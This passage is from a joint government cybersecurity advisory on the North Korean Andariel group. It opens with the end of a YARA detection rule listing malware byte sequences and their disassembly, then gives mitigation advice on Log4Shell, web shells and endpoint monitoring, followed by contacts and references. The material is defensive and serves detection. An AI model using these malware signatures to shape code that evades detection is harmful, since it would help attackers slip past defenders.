&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c410&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, 0x10<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b558c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x74]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_6 = { 8b4d0c 51 68???????? 8d9560eaffff 52 e8???????? }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4d0c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0xc]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;51&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;68????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8d9560eaffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| lea&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, [ebp - 0x15a0]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;52&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| push&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e8????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_7 = { 83c001 8945f4 837df420 7d2c 8b4df8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945f4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;837df420&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0xc], 0x20<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;7d2c&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x2e<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 8]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_8 = { 83c001 89856cf6ffff 8b8d70f6ffff 8a11 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 300<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;83c001&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;89856cf6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x994], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b8d70f6ffff&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x990]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8a11&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dl, byte ptr [ecx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_9 = { 0355f0 0fb602 0fb64df7 33c1 0fb655fc 33c2 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb64df7&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, byte ptr [ebp - 9]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;//&nbsp; &nbsp; 0fb655fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, byte ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;33c2&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| xor&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_10 = { d1e9 894df8 8b5518 8955fc c745f000000000 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 5, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;d1e9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 1<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894df8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c745f000000000&nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 0x10], 0<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_11 = { 8b4df0 3b4d10 0f8d90000000 8b5508 0355f0 0fb602 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4df0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;3b4d10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| cmp&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp + 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0f8d90000000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| jge&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0x96<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5508&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0355f0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| add&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp - 0x10]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0fb602&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| movzx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, byte ptr [edx]<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_12 = { 894d14 8b45f8 c1e018 8b4dfc c1e908 0bc1 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894d14&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x14], ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b45f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp - 8]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e018&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shl&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, 0x18<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4dfc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, dword ptr [ebp - 4]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;c1e908&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| shr&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ecx, 8<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_13 = { 0bc1 894518 8b5514 8955f8 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 4, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;0bc1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| or&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax, ecx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;894518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp + 0x18], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br><br>&nbsp; &nbsp; &nbsp; &nbsp; $sequence_14 = { 8b5514 8955f8 8b4518 8945fc e9???????? 8be5 }<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // n = 6, score = 200<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b5514&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;edx, dword ptr [ebp + 0x14]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8955f8&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 8], edx<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8b4518&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax, dword ptr [ebp + 0x18]<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8945fc&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dword ptr [ebp - 4], eax<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;e9????????&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //&nbsp; &nbsp;8be5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| mov&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;esp, ebp<br><br>&nbsp; &nbsp; condition:<br>&nbsp; &nbsp; &nbsp; &nbsp; 7 of them and filesize &lt; 1736704<br>}</td>
</tr>
</tbody>
</table>
<h2><strong>Mitigation Measures</strong></h2>
<p>The authoring agencies recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on the threat actors’ activity.</p>
<h3>Log4Shell and Other Log4j Vulnerabilities</h3>
<p>Defenders should consult the joint Cybersecurity Advisory titled “<a href=\"https://media.defense.gov/2021/Dec/22/2002914139/-1/-1/1/JOINT_CSA_MITIGATING_LOG4SHELL_OTHER_LOG4J_VULNERABILITIES_20211222_.PDF\" title=\"Mitigating Log4Shell and Other Log4j-Related Vulnerabilities\">Mitigating Log4Shell and Other Log4j-Related Vulnerabilities</a>” and CISA’s “<a href=\"https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance\" title=\"Apache Log4j Vulnerability Guidance\">Apache Log4j Vulnerability</a>” guidance. Organizations can mitigate the risks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j-related vulnerabilities and upgrading Log4j assets and affected products to the latest version.&nbsp;</p>
<p><strong>Note:</strong> CVE-2021-44228 ‘Log4Shell’ was disclosed in December 2021 and affects the Log4j library prior to version 2.17.0.</p>
<p>Defenders should remain alert to vendor software updates, and initiate hunt and incident response procedures to detect possible Log4Shell exploitation.</p>
<h3>Web Shell Malware</h3>
<p>Web shell malware is deployed by adversaries on a victim’s web server to execute arbitrary system commands. The NSA and Australian Signals Directorate’s report titled “<a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" title=\"Detect and Prevent Web Shell Malware\">Detect and Prevent Web Shell Malware</a>” provides mitigating actions to identify and recover from web shells.</p>
<p>Preventing exploitation of web-facing servers often depends on maintaining an inventory of systems and applications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application Firewalls (WAFs).</p>
<h3>Endpoint Activity</h3>
<p>Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server to critical assets.</p>
<h3>Command Line Activity and Remote Access</h3>
<p>Monitoring for suspicious command-line activity, implementing multi-factor authentication for remote access services, and properly segmenting and using allow-listing tools for critical assets can protect against malicious activity by RGB 3rd Bureau’s Andariel group and other cyber threat actors.</p>
<h3><strong>Packing</strong></h3>
<p>Signatures for Themida, VMProtect and a number of other packers are available <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">here</a>, however, the signatures will not identify every file packed using these applications.</p>
<h3>Additional Mitigation Measures for Malicious Activities</h3>
<ul>
<li>Check for security vulnerabilities, apply patches, and update to the latest version of software</li>
<li>Encrypt all sensitive data including personal information</li>
<li>Block access to unused ports</li>
<li>Change passwords when they are suspected of being compromised</li>
<li>Alert on unexpected use of dual-use applications</li>
<li>Strengthen the subscriber identity authentication process for leased servers</li>
</ul>
<h3>DPRK Rewards for Justice</h3>
<p>The U.S. and ROK Governments encourage victims to report suspicious activities, including those related to suspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such information through the Department of State’s Rewards for Justice program could make you eligible to receive an award of up to $10 million. For further details, please visit <a href=\"https://rewardsforjustice.net/\" title=\"Rewards for Justice – Intelligence-Driven Law Enforcement\">https://rewardsforjustice.net/</a>.</p>
<h2><strong>Acknowledgements</strong></h2>
<p>Mandiant and Microsoft Threat Intelligence contributed to this CSA.</p>
<h3>Disclaimer of Endorsement</h3>
<p>Your organization has no obligation to respond or provide information in response to this product. &nbsp;If, after reviewing the information provided, your organization decides to provide information to the authorizing agencies, it must do so consistent with applicable state and federal law.</p>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or service by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the co-authors.</p>
<h3>Version History</h3>
<p>July 25, 2024: Initial version.</p>
<p>August 6, 2024: Updated “Credential Access” and “Commodity Malware and Dual-Use Applications” sections.</p>
<h3>Trademark Recognition</h3>
<p>Active Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of Microsoft Corporation. MITRE® and ATT&amp;CK® are registered trademarks of The MITRE Corporation.</p>
<h3>Purpose</h3>
<p>This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.</p>
<h3>Contact</h3>
<p><strong>U.S. organizations:</strong> Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report or to the FBI via your local FBI field office listed at <a href=\"https://www.fbi.gov/contact-us/fieldoffices\" title=\"Field Offices\">https://www.fbi.gov/contact-us/fieldoffices</a>.</p>
<p><strong>DC3 Cyber Forensics Laboratory (CFL):&nbsp;</strong><a href=\"mailto:afosi.dc3.cflintake@us.af.mil\" title=\"DC3 Cyber Forensics Laboratory\">afosi.dc3.cflintake@us.af.mil</a></p>
<p><strong>DoD-Defense Industrial Base (DIB) Collaborative Information Sharing Environment (DCISE):&nbsp;</strong><a href=\"mailto:dc3.dcise@us.af.mil\" title=\"DoD-Defense Industrial Base Collaborative Information Sharing Environment\">dc3.dcise@us.af.mil</a></p>
<p><strong>NSA Cybersecurity Report Questions and Feedback:&nbsp;</strong><a href=\"mailto:CybersecurityReports@nsa.gov\" title=\"NSA Cybersecurity Report Questions and Feedback\">CybersecurityReports@nsa.gov</a></p>
<p><strong>NSA Defense Industrial Base Inquiries and Cybersecurity Services:&nbsp;</strong><a href=\"mailto:DIB_Defense@cyber.nsa.gov\" title=\"NSA Defense Industrial Base Inquiries and Cybersecurity Services\">DIB_Defense@cyber.nsa.gov</a></p>
<p><strong>NSA Media Inquiries / Press Desk:&nbsp;</strong>443-634-0721, <a href=\"mailto:MediaRelations@nsa.gov\" title=\"NSA Media Inquiries / Press Desk\">MediaRelations@nsa.gov</a></p>
<p><strong>Republic of Korea organizations:</strong> If you suspect cyber incidents involving state actors, including Andariel, or discover similar cases, please contact the relevant authorities below.</p>
<p><strong>National Intelligence Service:&nbsp;</strong><a href=\"http://www.nis.go.kr\" title=\"National Intelligence Service\">www.nis.go.kr</a>, +82 111</p>
<h2><strong>References</strong></h2>
<p>AhnLab Security Emergency Response Center:</p>
<ul>
<li><a href=\"https://asec.ahnlab.com/en/56405/\" title=\"Analysis of Andariel’s New Attack Activities\">https://asec.ahnlab.com/en/56405/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/59073/\" title=\"Circumstances of an Attack Exploiting an Asset Management Program (Andariel Group)\">https://asec.ahnlab.com/en/59073/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/66088/\" title=\"Analysis of APT Attack Cases Using Dora RAT Against Korean Companies (Andariel Group)\">https://asec.ahnlab.com/en/66088/</a></li>
</ul>
<p>Boredhackerblog: <a href=\"http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html\" title=\"boredhackerblog\">http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html</a></p>
<p>Cisco Talos Intelligence blogs:</p>
<ul>
<li><a href=\"https://blog.talosintelligence.com/lazarus-three-rats/\" title=\"Lazarus and the tale of three RATs\">https://blog.talosintelligence.com/lazarus-three-rats/</a>&nbsp;</li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-magicrat/\" title=\"MagicRAT: Lazarus’ latest gateway into victim networks\">https://blog.talosintelligence.com/lazarus-magicrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-collectionrat/\" title=\"Lazarus Group's infrastructure reuse leads to discovery of new malware\">https://blog.talosintelligence.com/lazarus-collectionrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-quiterat/\" title=\"Lazarus Group exploits ManageEngine vulnerability to deploy QuiteRAT\">https://blog.talosintelligence.com/lazarus-quiterat/</a></li>
</ul>
<p>DCSO blog: <a href=\"https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499\" title=\"Andariel’s “Jupiter” malware and the case of the curious C2\">https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499</a></p>
<p>Github.com/ditekshen: <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar</a></p>
<p>JPCERT blogs:</p>
<ul>
<li><a href=\"https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html\" title=\"Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)\">https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html</a></li>
<li><a href=\"https://blogs.jpcert.or.jp/en/2022/07/yamabot.html\" title=\"YamaBot Malware Used by Lazarus\">https://blogs.jpcert.or.jp/en/2022/07/yamabot.html</a></li>
</ul>
<p>Mandiant blogs:</p>
<ul>
<li><a href=\"https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023\" title=\"Assessed Cyber Structure and Alignments of North Korea in 2023\">https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023</a></li>
<li><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government</a></li>
</ul>
<p>Microsoft blogs:</p>
<ul>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/\" title=\"Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability\">https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/</a></li>
